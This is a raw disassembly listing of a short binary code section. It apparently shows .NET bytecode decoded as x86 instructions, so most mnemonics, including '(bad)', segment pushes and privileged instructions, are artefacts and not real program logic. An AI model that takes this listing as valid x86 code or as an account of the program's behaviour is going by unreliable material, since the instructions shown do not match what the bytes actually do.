  4025cb:	70 a2                	jo     0x40256f
  4025cd:	11 13                	adc    %edx,(%ebx)
  4025cf:	14 14                	adc    $0x14,%al
  4025d1:	16                   	push   %ss
  4025d2:	17                   	pop    %ss
  4025d3:	28 43 00             	sub    %al,0x0(%ebx)
  4025d6:	00 0a                	add    %cl,(%edx)
  4025d8:	11 12                	adc    %edx,(%edx)
  4025da:	14 72                	adc    $0x72,%al
  4025dc:	75 03                	jne    0x4025e1
  4025de:	00 70 16             	add    %dh,0x16(%eax)
  4025e1:	8d 03                	lea    (%ebx),%eax
  4025e3:	00 00                	add    %al,(%eax)
  4025e5:	01 14 14             	add    %edx,(%esp,%edx,1)
  4025e8:	14 17                	adc    $0x17,%al
  4025ea:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4025ee:	0a 26                	or     (%esi),%ah
  4025f0:	14 13                	adc    $0x13,%al
  4025f2:	12 11                	adc    (%ecx),%dl
  4025f4:	0c 19                	or     $0x19,%al
  4025f6:	73 45                	jae    0x40263d
  4025f8:	00 00                	add    %al,(%eax)
  4025fa:	0a 80 29 00 00 04    	or     0x4000029(%eax),%al
  402600:	de 0f                	fimuls (%edi)
  402602:	25 28 25 00 00       	and    $0x2528,%eax
  402607:	0a 13                	or     (%ebx),%dl
  402609:	0d 28 27 00 00       	or     $0x2728,%eax
  40260e:	0a de                	or     %dh,%bl
  402610:	00 28                	add    %ch,(%eax)
  402612:	48                   	dec    %eax
  402613:	00 00                	add    %al,(%eax)
  402615:	06                   	push   %es
  402616:	28 6e 00             	sub    %ch,0x0(%esi)
  402619:	00 06                	add    %al,(%esi)
  40261b:	14 fe                	adc    $0xfe,%al
  40261d:	06                   	push   %es
  40261e:	1e                   	push   %ds
  40261f:	00 00                	add    %al,(%eax)
  402621:	06                   	push   %es
  402622:	73 46                	jae    0x40266a
  402624:	00 00                	add    %al,(%eax)
  402626:	0a 73 47             	or     0x47(%ebx),%dh
  402629:	00 00                	add    %al,(%eax)
  40262b:	0a 6f 48             	or     0x48(%edi),%ch
  40262e:	00 00                	add    %al,(%eax)
  402630:	0a 28                	or     (%eax),%ch
  402632:	28 00                	sub    %al,(%eax)
  402634:	00 06                	add    %al,(%esi)
  402636:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402639:	00 0a                	add    %cl,(%edx)
  40263b:	2c 05                	sub    $0x5,%al
  40263d:	28 60 00             	sub    %ah,0x0(%eax)
  402640:	00 06                	add    %al,(%esi)
  402642:	14 fe                	adc    $0xfe,%al
  402644:	06                   	push   %es
  402645:	1f                   	pop    %ds
  402646:	00 00                	add    %al,(%eax)
  402648:	06                   	push   %es
  402649:	73 46                	jae    0x402691
  40264b:	00 00                	add    %al,(%eax)
  40264d:	0a 73 47             	or     0x47(%ebx),%dh
  402650:	00 00                	add    %al,(%eax)
  402652:	0a 0b                	or     (%ebx),%cl
  402654:	14 fe                	adc    $0xfe,%al
  402656:	06                   	push   %es
  402657:	20 00                	and    %al,(%eax)
  402659:	00 06                	add    %al,(%esi)
  40265b:	73 46                	jae    0x4026a3
  40265d:	00 00                	add    %al,(%eax)
  40265f:	0a 73 47             	or     0x47(%ebx),%dh
  402662:	00 00                	add    %al,(%eax)
  402664:	0a 0c 07             	or     (%edi,%eax,1),%cl
  402667:	6f                   	outsl  %ds:(%esi),(%dx)
  402668:	48                   	dec    %eax
  402669:	00 00                	add    %al,(%eax)
  40266b:	0a 08                	or     (%eax),%cl
  40266d:	6f                   	outsl  %ds:(%esi),(%dx)
  40266e:	48                   	dec    %eax
  40266f:	00 00                	add    %al,(%eax)
  402671:	0a 08                	or     (%eax),%cl
  402673:	6f                   	outsl  %ds:(%esi),(%dx)
  402674:	49                   	dec    %ecx
  402675:	00 00                	add    %al,(%eax)
  402677:	0a 2a                	or     (%edx),%ch
  402679:	00 00                	add    %al,(%eax)
  40267b:	00 01                	add    %al,(%ecx)
  40267d:	4c                   	dec    %esp
  40267e:	00 00                	add    %al,(%eax)
  402680:	00 00                	add    %al,(%eax)
  402682:	10 00                	adc    %al,(%eax)
  402684:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402685:	b7 00                	mov    $0x0,%bh
  402687:	14 29                	adc    $0x29,%al
  402689:	00 00                	add    %al,(%eax)
  40268b:	01 00                	add    %eax,(%eax)
  40268d:	00 d8                	add    %bl,%al
  40268f:	00 07                	add    %al,(%edi)
  402691:	df 00                	filds  (%eax)
  402693:	0f 29 00             	movaps %xmm0,(%eax)
  402696:	00 01                	add    %al,(%ecx)
  402698:	00 00                	add    %al,(%eax)
  40269a:	08 01                	or     %al,(%ecx)
  40269c:	60                   	pusha
  40269d:	68 01 0f 29 00       	push   $0x290f01
  4026a2:	00 01                	add    %al,(%ecx)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	77 01                	ja     0x4026a9
  4026a8:	bc 33 02 0f 29       	mov    $0x290f0233,%esp
  4026ad:	00 00                	add    %al,(%eax)
  4026af:	01 00                	add    %eax,(%eax)
  4026b1:	00 42 02             	add    %al,0x2(%edx)
  4026b4:	2c 6e                	sub    $0x6e,%al
  4026b6:	02 0f                	add    (%edi),%cl
  4026b8:	29 00                	sub    %eax,(%eax)
  4026ba:	00 01                	add    %al,(%ecx)
  4026bc:	00 00                	add    %al,(%eax)
  4026be:	7d 02                	jge    0x4026c2
  4026c0:	f5                   	cmc
  4026c1:	72 03                	jb     0x4026c6
  4026c3:	0f 29 00             	movaps %xmm0,(%eax)
  4026c6:	00 01                	add    %al,(%ecx)
  4026c8:	1b 30                	sbb    (%eax),%esi
  4026ca:	04 00                	add    $0x0,%al
  4026cc:	fc                   	cld
  4026cd:	00 00                	add    %al,(%eax)
  4026cf:	00 0d 00 00 11 28    	add    %cl,0x28110000
  4026d5:	28 00                	sub    %al,(%eax)
  4026d7:	00 06                	add    %al,(%esi)
  4026d9:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026dc:	00 0a                	add    %cl,(%edx)
  4026de:	39 ec                	cmp    %ebp,%esp
  4026e0:	00 00                	add    %al,(%eax)
  4026e2:	00 73 4a             	add    %dh,0x4a(%ebx)
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	0a 0a                	or     (%edx),%cl
  4026e9:	06                   	push   %es
  4026ea:	72 7f                	jb     0x40276b
  4026ec:	03 00                	add    (%eax),%eax
  4026ee:	70 6f                	jo     0x40275f
  4026f0:	4b                   	dec    %ebx
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	0a 06                	or     (%esi),%al
  4026f5:	17                   	pop    %ss
  4026f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f7:	33 00                	xor    (%eax),%eax
  4026f9:	00 0a                	add    %cl,(%edx)
  4026fb:	06                   	push   %es
  4026fc:	72 9d                	jb     0x40269b
  4026fe:	03 00                	add    (%eax),%eax
  402700:	70 7e                	jo     0x402780
  402702:	2d 00 00 04 72       	sub    $0x72040000,%eax
  402707:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40270a:	70 28                	jo     0x402734
  40270c:	28 00                	sub    %al,(%eax)
  40270e:	00 0a                	add    %cl,(%edx)
  402710:	6f                   	outsl  %ds:(%esi),(%dx)
  402711:	37                   	aaa
  402712:	00 00                	add    %al,(%eax)
  402714:	0a 06                	or     (%esi),%al
  402716:	28 38                	sub    %bh,(%eax)
  402718:	00 00                	add    %al,(%eax)
  40271a:	0a 6f 39             	or     0x39(%edi),%ch
  40271d:	00 00                	add    %al,(%eax)
  40271f:	0a 06                	or     (%esi),%al
  402721:	72 15                	jb     0x402738
  402723:	04 00                	add    $0x0,%al
  402725:	70 28                	jo     0x40274f
  402727:	4c                   	dec    %esp
  402728:	00 00                	add    %al,(%eax)
  40272a:	0a 6f 4d             	or     0x4d(%edi),%ch
  40272d:	00 00                	add    %al,(%eax)
  40272f:	0a 6f 4e             	or     0x4e(%edi),%ch
  402732:	00 00                	add    %al,(%eax)
  402734:	0a 72 11             	or     0x11(%edx),%dh
  402737:	04 00                	add    $0x0,%al
  402739:	70 28                	jo     0x402763
  40273b:	28 00                	sub    %al,(%eax)
  40273d:	00 0a                	add    %cl,(%edx)
  40273f:	6f                   	outsl  %ds:(%esi),(%dx)
  402740:	37                   	aaa
  402741:	00 00                	add    %al,(%eax)
  402743:	0a 06                	or     (%esi),%al
  402745:	28 38                	sub    %bh,(%eax)
  402747:	00 00                	add    %al,(%eax)
  402749:	0a 6f 39             	or     0x39(%edi),%ch
  40274c:	00 00                	add    %al,(%eax)
  40274e:	0a 06                	or     (%esi),%al
  402750:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  402756:	0c 08                	or     $0x8,%al
  402758:	16                   	push   %ss
  402759:	72 9d                	jb     0x4026f8
  40275b:	03 00                	add    (%eax),%eax
  40275d:	70 a2                	jo     0x402701
  40275f:	08 17                	or     %dl,(%edi)
  402761:	7e 0e                	jle    0x402771
  402763:	00 00                	add    %al,(%eax)
  402765:	04 a2                	add    $0xa2,%al
  402767:	08 18                	or     %bl,(%eax)
  402769:	72 c9                	jb     0x402734
  40276b:	01 00                	add    %eax,(%eax)
  40276d:	70 a2                	jo     0x402711
  40276f:	08 19                	or     %bl,(%ecx)
  402771:	7e 0f                	jle    0x402782
  402773:	00 00                	add    %al,(%eax)
  402775:	04 a2                	add    $0xa2,%al
  402777:	08 1a                	or     %bl,(%edx)
  402779:	72 11                	jb     0x40278c
  40277b:	04 00                	add    $0x0,%al
  40277d:	70 a2                	jo     0x402721
  40277f:	08 28                	or     %ch,(%eax)
  402781:	36 00 00             	add    %al,%ss:(%eax)
  402784:	0a 6f 37             	or     0x37(%edi),%ch
  402787:	00 00                	add    %al,(%eax)
  402789:	0a 06                	or     (%esi),%al
  40278b:	28 38                	sub    %bh,(%eax)
  40278d:	00 00                	add    %al,(%eax)
  40278f:	0a 6f 39             	or     0x39(%edi),%ch
  402792:	00 00                	add    %al,(%eax)
  402794:	0a 06                	or     (%esi),%al
  402796:	72 15                	jb     0x4027ad
  402798:	04 00                	add    $0x0,%al
  40279a:	70 7e                	jo     0x40281a
  40279c:	0f 00 00             	sldt   (%eax)
  40279f:	04 28                	add    $0x28,%al
  4027a1:	4f                   	dec    %edi
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	0a 72 11             	or     0x11(%edx),%dh
  4027a7:	04 00                	add    $0x0,%al
  4027a9:	70 28                	jo     0x4027d3
  4027ab:	28 00                	sub    %al,(%eax)
  4027ad:	00 0a                	add    %cl,(%edx)
  4027af:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b0:	37                   	aaa
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	0a 06                	or     (%esi),%al
  4027b5:	28 38                	sub    %bh,(%eax)
  4027b7:	00 00                	add    %al,(%eax)
  4027b9:	0a 6f 39             	or     0x39(%edi),%ch
  4027bc:	00 00                	add    %al,(%eax)
  4027be:	0a de                	or     %dh,%bl
  4027c0:	0e                   	push   %cs
  4027c1:	25 28 25 00 00       	and    $0x2528,%eax
  4027c6:	0a 0b                	or     (%ebx),%cl
  4027c8:	28 27                	sub    %ah,(%edi)
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	0a de                	or     %dh,%bl
  4027ce:	00 2a                	add    %ch,(%edx)
  4027d0:	01 10                	add    %edx,(%eax)
  4027d2:	00 00                	add    %al,(%eax)
  4027d4:	00 00                	add    %al,(%eax)
  4027d6:	0f 00 de             	ltr    %esi
  4027d9:	ed                   	in     (%dx),%eax
  4027da:	00 0e                	add    %cl,(%esi)
  4027dc:	29 00                	sub    %eax,(%eax)
  4027de:	00 01                	add    %al,(%ecx)
  4027e0:	c2 28 19             	ret    $0x1928
  4027e3:	00 00                	add    %al,(%eax)
  4027e5:	06                   	push   %es
  4027e6:	2d 07 28 1a 00       	sub    $0x1a2807,%eax
  4027eb:	00 06                	add    %al,(%esi)
  4027ed:	2c 02                	sub    $0x2,%al
  4027ef:	2b 07                	sub    (%edi),%eax
  4027f1:	28 1b                	sub    %bl,(%ebx)
  4027f3:	00 00                	add    %al,(%eax)
  4027f5:	06                   	push   %es
  4027f6:	2c 02                	sub    $0x2,%al
  4027f8:	2b 07                	sub    (%edi),%eax
  4027fa:	28 18                	sub    %bl,(%eax)
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	06                   	push   %es
  4027ff:	2c 02                	sub    $0x2,%al
  402801:	2b 07                	sub    (%edi),%eax
  402803:	28 17                	sub    %dl,(%edi)
  402805:	00 00                	add    %al,(%eax)
  402807:	06                   	push   %es
  402808:	2c 06                	sub    $0x6,%al
  40280a:	14 28                	adc    $0x28,%al
  40280c:	50                   	push   %eax
  40280d:	00 00                	add    %al,(%eax)
  40280f:	0a 2a                	or     (%edx),%ch
  402811:	00 00                	add    %al,(%eax)
  402813:	00 1b                	add    %bl,(%ebx)
  402815:	30 02                	xor    %al,(%edx)
  402817:	00 32                	add    %dh,(%edx)
  402819:	00 00                	add    %al,(%eax)
  40281b:	00 0e                	add    %cl,(%esi)
  40281d:	00 00                	add    %al,(%eax)
  40281f:	11 73 51             	adc    %esi,0x51(%ebx)
  402822:	00 00                	add    %al,(%eax)
  402824:	0a 72 8f             	or     -0x71(%edx),%dh
  402827:	04 00                	add    $0x0,%al
  402829:	70 6f                	jo     0x40289a
  40282b:	52                   	push   %edx
  40282c:	00 00                	add    %al,(%eax)
  40282e:	0a 0b                	or     (%ebx),%cl
  402830:	07                   	pop    %es
  402831:	72 dd                	jb     0x402810
  402833:	04 00                	add    $0x0,%al
  402835:	70 6f                	jo     0x4028a6
  402837:	53                   	push   %ebx
  402838:	00 00                	add    %al,(%eax)
  40283a:	0a 0a                	or     (%edx),%cl
  40283c:	de 12                	ficoms (%edx)
  40283e:	de 0c 28             	fimuls (%eax,%ebp,1)
  402841:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402846:	27                   	daa
  402847:	00 00                	add    %al,(%eax)
  402849:	0a de                	or     %dh,%bl
  40284b:	00 16                	add    %dl,(%esi)
  40284d:	0a 2b                	or     (%ebx),%ch
  40284f:	00 06                	add    %al,(%esi)
  402851:	2a 00                	sub    (%eax),%al
  402853:	00 01                	add    %al,(%ecx)
  402855:	10 00                	adc    %al,(%eax)
  402857:	00 00                	add    %al,(%eax)
  402859:	00 00                	add    %al,(%eax)
  40285b:	00 20                	add    %ah,(%eax)
  40285d:	20 00                	and    %al,(%eax)
  40285f:	0c 29                	or     $0x29,%al
  402861:	00 00                	add    %al,(%eax)
  402863:	01 1b                	add    %ebx,(%ebx)
  402865:	30 02                	xor    %al,(%edx)
  402867:	00 33                	add    %dh,(%ebx)
  402869:	00 00                	add    %al,(%eax)
  40286b:	00 0f                	add    %cl,(%edi)
  40286d:	00 00                	add    %al,(%eax)
  40286f:	11 73 54             	adc    %esi,0x54(%ebx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 6f 55             	or     0x55(%edi),%ch
  402877:	00 00                	add    %al,(%eax)
  402879:	0a 6f 56             	or     0x56(%edi),%ch
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 72 e7             	or     -0x19(%edx),%dh
  402881:	04 00                	add    $0x0,%al
  402883:	70 6f                	jo     0x4028f4
  402885:	53                   	push   %ebx
  402886:	00 00                	add    %al,(%eax)
  402888:	0a 2c 04             	or     (%esp,%eax,1),%ch
  40288b:	17                   	pop    %ss
  40288c:	0a de                	or     %dh,%bl
  40288e:	12 de                	adc    %dh,%bl
  402890:	0c 28                	or     $0x28,%al
  402892:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402897:	27                   	daa
  402898:	00 00                	add    %al,(%eax)
  40289a:	0a de                	or     %dh,%bl
  40289c:	00 16                	add    %dl,(%esi)
  40289e:	0a 2b                	or     (%ebx),%ch
  4028a0:	00 06                	add    %al,(%esi)
  4028a2:	2a 00                	sub    (%eax),%al
  4028a4:	01 10                	add    %edx,(%eax)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	21 21                	and    %esp,(%ecx)
  4028ae:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	01 1b                	add    %ebx,(%ebx)
  4028b5:	30 07                	xor    %al,(%edi)
  4028b7:	00 48 01             	add    %cl,0x1(%eax)
  4028ba:	00 00                	add    %al,(%eax)
  4028bc:	10 00                	adc    %al,(%eax)
  4028be:	00 11                	add    %dl,(%ecx)
  4028c0:	72 ed                	jb     0x4028af
  4028c2:	04 00                	add    $0x0,%al
  4028c4:	70 73                	jo     0x402939
  4028c6:	57                   	push   %edi
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	0a 0b                	or     (%ebx),%cl
  4028cb:	07                   	pop    %es
  4028cc:	14 72                	adc    $0x72,%al
  4028ce:	33 05 00 70 16 8d    	xor    0x8d167000,%eax
  4028d4:	03 00                	add    (%eax),%eax
  4028d6:	00 01                	add    %al,(%ecx)
  4028d8:	14 14                	adc    $0x14,%al
  4028da:	14 28                	adc    $0x28,%al
  4028dc:	41                   	inc    %ecx
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	0a 28                	or     (%eax),%ch
  4028e1:	11 00                	adc    %eax,(%eax)
  4028e3:	00 0a                	add    %cl,(%edx)
  4028e5:	0d 09 74 41 00       	or     $0x417409,%eax
  4028ea:	00 01                	add    %al,(%ecx)
  4028ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ed:	58                   	pop    %eax
  4028ee:	00 00                	add    %al,(%eax)
  4028f0:	0a 13                	or     (%ebx),%dl
  4028f2:	05 38 b6 00 00       	add    $0xb638,%eax
  4028f7:	00 11                	add    %dl,(%ecx)
  4028f9:	05 6f 59 00 00       	add    $0x596f,%eax
  4028fe:	0a 28                	or     (%eax),%ch
  402900:	11 00                	adc    %eax,(%eax)
  402902:	00 0a                	add    %cl,(%edx)
  402904:	0c 08                	or     $0x8,%al
  402906:	17                   	pop    %ss
  402907:	8d 03                	lea    (%ebx),%eax
  402909:	00 00                	add    %al,(%eax)
  40290b:	01 13                	add    %edx,(%ebx)
  40290d:	06                   	push   %es
  40290e:	11 06                	adc    %eax,(%esi)
  402910:	16                   	push   %ss
  402911:	72 3b                	jb     0x40294e
  402913:	05 00 70 a2 11       	add    $0x11a27000,%eax
  402918:	06                   	push   %es
  402919:	14 28                	adc    $0x28,%al
  40291b:	5a                   	pop    %edx
  40291c:	00 00                	add    %al,(%eax)
  40291e:	0a 6f 15             	or     0x15(%edi),%ch
  402921:	00 00                	add    %al,(%eax)
  402923:	0a 6f 56             	or     0x56(%edi),%ch
  402926:	00 00                	add    %al,(%eax)
  402928:	0a 13                	or     (%ebx),%dl
  40292a:	04 11                	add    $0x11,%al
  40292c:	04 72                	add    $0x72,%al
  40292e:	55                   	push   %ebp
  40292f:	05 00 70 16 28       	add    $0x28167000,%eax
  402934:	5b                   	pop    %ebx
  402935:	00 00                	add    %al,(%eax)
  402937:	0a 16                	or     (%esi),%dl
  402939:	33 32                	xor    (%edx),%esi
  40293b:	08 17                	or     %dl,(%edi)
  40293d:	8d 03                	lea    (%ebx),%eax
  40293f:	00 00                	add    %al,(%eax)
  402941:	01 13                	add    %edx,(%ebx)
  402943:	06                   	push   %es
  402944:	11 06                	adc    %eax,(%esi)
  402946:	16                   	push   %ss
  402947:	72 81                	jb     0x4028ca
  402949:	05 00 70 a2 11       	add    $0x11a27000,%eax
  40294e:	06                   	push   %es
  40294f:	14 28                	adc    $0x28,%al
  402951:	5a                   	pop    %edx
  402952:	00 00                	add    %al,(%eax)
  402954:	0a 6f 15             	or     0x15(%edi),%ch
  402957:	00 00                	add    %al,(%eax)
  402959:	0a 6f 5c             	or     0x5c(%edi),%ch
  40295c:	00 00                	add    %al,(%eax)
  40295e:	0a 72 8d             	or     -0x73(%edx),%dh
  402961:	05 00 70 6f 53       	add    $0x536f7000,%eax
  402966:	00 00                	add    %al,(%eax)
  402968:	0a 2c 02             	or     (%edx,%eax,1),%ch
  40296b:	2b 0e                	sub    (%esi),%ecx
  40296d:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402970:	9d                   	popf
  402971:	05 00 70 6f 53       	add    $0x536f7000,%eax
  402976:	00 00                	add    %al,(%eax)
  402978:	0a 2c 02             	or     (%edx,%eax,1),%ch
  40297b:	2b 2d 08 17 8d 03    	sub    0x38d1708,%ebp
  402981:	00 00                	add    %al,(%eax)
  402983:	01 13                	add    %edx,(%ebx)
  402985:	07                   	pop    %es
  402986:	11 07                	adc    %eax,(%edi)
  402988:	16                   	push   %ss
  402989:	72 81                	jb     0x40290c
  40298b:	05 00 70 a2 11       	add    $0x11a27000,%eax
  402990:	07                   	pop    %es
  402991:	14 28                	adc    $0x28,%al
  402993:	5a                   	pop    %edx
  402994:	00 00                	add    %al,(%eax)
  402996:	0a 6f 15             	or     0x15(%edi),%ch
  402999:	00 00                	add    %al,(%eax)
  40299b:	0a 72 ab             	or     -0x55(%edx),%dh
  40299e:	05 00 70 16 28       	add    $0x28167000,%eax
  4029a3:	5b                   	pop    %ebx
  4029a4:	00 00                	add    %al,(%eax)
  4029a6:	0a 16                	or     (%esi),%dl
  4029a8:	33 04 17             	xor    (%edi,%edx,1),%eax
  4029ab:	0a de                	or     %dh,%bl
  4029ad:	58                   	pop    %eax
  4029ae:	11 05 6f 5d 00 00    	adc    %eax,0x5d6f
  4029b4:	0a 3a                	or     (%edx),%bh
  4029b6:	3e ff                	ds (bad)
  4029b8:	ff                   	(bad)
  4029b9:	ff                   	lcall  (bad)
  4029ba:	de 16                	ficoms (%esi)
  4029bc:	11 05 75 43 00 00    	adc    %eax,0x4375
  4029c2:	01 2c 0c             	add    %ebp,(%esp,%ecx,1)
  4029c5:	11 05 75 43 00 00    	adc    %eax,0x4375
  4029cb:	01 6f 5e             	add    %ebp,0x5e(%edi)
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a dc                	or     %ah,%bl
  4029d2:	de 0f                	fimuls (%edi)
  4029d4:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  4029d7:	09 74 43 00          	or     %esi,0x0(%ebx,%eax,2)
  4029db:	00 01                	add    %al,(%ecx)
  4029dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029de:	5e                   	pop    %esi
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	0a dc                	or     %ah,%bl
  4029e3:	de 0f                	fimuls (%edi)
  4029e5:	07                   	pop    %es
  4029e6:	2c 0b                	sub    $0xb,%al
  4029e8:	07                   	pop    %es
  4029e9:	74 43                	je     0x402a2e
  4029eb:	00 00                	add    %al,(%eax)
  4029ed:	01 6f 5e             	add    %ebp,0x5e(%edi)
  4029f0:	00 00                	add    %al,(%eax)
  4029f2:	0a dc                	or     %ah,%bl
  4029f4:	de 0c 28             	fimuls (%eax,%ebp,1)
  4029f7:	25 00 00 0a 28       	and    $0x280a0000,%eax
  4029fc:	27                   	daa
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	0a de                	or     %dh,%bl
  402a01:	00 16                	add    %dl,(%esi)
  402a03:	0a 2b                	or     (%ebx),%ch
  402a05:	00 06                	add    %al,(%esi)
  402a07:	2a 41 64             	sub    0x64(%ecx),%al
  402a0a:	00 00                	add    %al,(%eax)
  402a0c:	02 00                	add    (%eax),%al
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	26 00 00             	add    %al,%es:(%eax)
  402a13:	00 d6                	add    %dl,%dh
  402a15:	00 00                	add    %al,(%eax)
  402a17:	00 fc                	add    %bh,%ah
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	00 16                	add    %dl,(%esi)
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	00 00                	add    %al,(%eax)
  402a21:	00 00                	add    %al,(%eax)
  402a23:	00 02                	add    %al,(%edx)
  402a25:	00 00                	add    %al,(%eax)
  402a27:	00 26                	add    %ah,(%esi)
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	00 ee                	add    %ch,%dh
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	00 14 01             	add    %dl,(%ecx,%eax,1)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0f 00 00             	sldt   (%eax)
  402a37:	00 00                	add    %al,(%eax)
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	00 02                	add    %al,(%edx)
  402a3d:	00 00                	add    %al,(%eax)
  402a3f:	00 0b                	add    %cl,(%ebx)
  402a41:	00 00                	add    %al,(%eax)
  402a43:	00 1a                	add    %bl,(%edx)
  402a45:	01 00                	add    %eax,(%eax)
  402a47:	00 25 01 00 00 0f    	add    %ah,0xf000001
	...
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 36                	add    %dh,(%esi)
  402a5d:	01 00                	add    %eax,(%eax)
  402a5f:	00 36                	add    %dh,(%esi)
  402a61:	01 00                	add    %eax,(%eax)
  402a63:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a66:	00 00                	add    %al,(%eax)
  402a68:	29 00                	sub    %eax,(%eax)
  402a6a:	00 01                	add    %al,(%ecx)
  402a6c:	1b 30                	sbb    (%eax),%esi
  402a6e:	02 00                	add    (%eax),%al
  402a70:	31 00                	xor    %eax,(%eax)
  402a72:	00 00                	add    %al,(%eax)
  402a74:	11 00                	adc    %eax,(%eax)
  402a76:	00 11                	add    %dl,(%ecx)
  402a78:	16                   	push   %ss
  402a79:	0b 28                	or     (%eax),%ebp
  402a7b:	4c                   	dec    %esp
  402a7c:	00 00                	add    %al,(%eax)
  402a7e:	0a 6f 5f             	or     0x5f(%edi),%ch
  402a81:	00 00                	add    %al,(%eax)
  402a83:	0a 12                	or     (%edx),%dl
  402a85:	01 28                	add    %ebp,(%eax)
  402a87:	1d 00 00 06 26       	sbb    $0x26060000,%eax
  402a8c:	07                   	pop    %es
  402a8d:	0a de                	or     %dh,%bl
  402a8f:	17                   	pop    %ss
  402a90:	de 15 28 25 00 00    	ficoms 0x2528
  402a96:	0a 07                	or     (%edi),%al
  402a98:	0a 28                	or     (%eax),%ch
  402a9a:	27                   	daa
  402a9b:	00 00                	add    %al,(%eax)
  402a9d:	0a de                	or     %dh,%bl
  402a9f:	07                   	pop    %es
  402aa0:	28 27                	sub    %ah,(%edi)
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	0a de                	or     %dh,%bl
  402aa6:	00 06                	add    %al,(%esi)
  402aa8:	2a 00                	sub    (%eax),%al
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	01 10                	add    %edx,(%eax)
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	02 00                	add    (%eax),%al
  402ab4:	18 1a                	sbb    %bl,(%edx)
  402ab6:	00 15 29 00 00 01    	add    %dl,0x1000029
  402abc:	1b 30                	sbb    (%eax),%esi
  402abe:	02 00                	add    (%eax),%al
  402ac0:	38 00                	cmp    %al,(%eax)
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	12 00                	adc    (%eax),%al
  402ac6:	00 11                	add    %dl,(%ecx)
  402ac8:	72 c1                	jb     0x402a8b
  402aca:	05 00 70 28 1c       	add    $0x1c287000,%eax
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	06                   	push   %es
  402ad2:	0b 12                	or     (%edx),%edx
  402ad4:	01 28                	add    %ebp,(%eax)
  402ad6:	60                   	pusha
  402ad7:	00 00                	add    %al,(%eax)
  402ad9:	0a 16                	or     (%esi),%dl
  402adb:	2e 06                	cs push %es
  402add:	17                   	pop    %ss
  402ade:	0a de                	or     %dh,%bl
  402ae0:	1d 2b 04 16 0a       	sbb    $0xa16042b,%eax
  402ae5:	de 17                	ficoms (%edi)
  402ae7:	de 15 28 25 00 00    	ficoms 0x2528
  402aed:	0a 16                	or     (%esi),%dl
  402aef:	0a 28                	or     (%eax),%ch
  402af1:	27                   	daa
  402af2:	00 00                	add    %al,(%eax)
  402af4:	0a de                	or     %dh,%bl
  402af6:	07                   	pop    %es
  402af7:	28 27                	sub    %ah,(%edi)
  402af9:	00 00                	add    %al,(%eax)
  402afb:	0a de                	or     %dh,%bl
  402afd:	00 06                	add    %al,(%esi)
  402aff:	2a 01                	sub    (%ecx),%al
  402b01:	10 00                	adc    %al,(%eax)
  402b03:	00 00                	add    %al,(%eax)
  402b05:	00 00                	add    %al,(%eax)
  402b07:	00 21                	add    %ah,(%ecx)
  402b09:	21 00                	and    %eax,(%eax)
  402b0b:	15 29 00 00 01       	adc    $0x1000029,%eax
  402b10:	22 28                	and    (%eax),%ch
  402b12:	4d                   	dec    %ebp
  402b13:	00 00                	add    %al,(%eax)
  402b15:	06                   	push   %es
  402b16:	2b 00                	sub    (%eax),%eax
  402b18:	2a 00                	sub    (%eax),%al
  402b1a:	00 00                	add    %al,(%eax)
  402b1c:	26 28 6a 00          	sub    %ch,%es:0x0(%edx)
  402b20:	00 06                	add    %al,(%esi)
  402b22:	26 2b 00             	sub    %es:(%eax),%eax
  402b25:	2a 00                	sub    (%eax),%al
  402b27:	00 ee                	add    %ch,%dh
  402b29:	2b 35 73 61 00 00    	sub    0x6173,%esi
  402b2f:	0a 20                	or     (%eax),%ah
  402b31:	b8 0b 00 00 20       	mov    $0x2000000b,%eax
  402b36:	10 27                	adc    %ah,(%edi)
  402b38:	00 00                	add    %al,(%eax)
  402b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3b:	62 00                	bound  %eax,(%eax)
  402b3d:	00 0a                	add    %cl,(%edx)
  402b3f:	28 22                	sub    %ah,(%edx)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	0a 7e 12             	or     0x12(%esi),%bh
  402b46:	00 00                	add    %al,(%eax)
  402b48:	04 2d                	add    $0x2d,%al
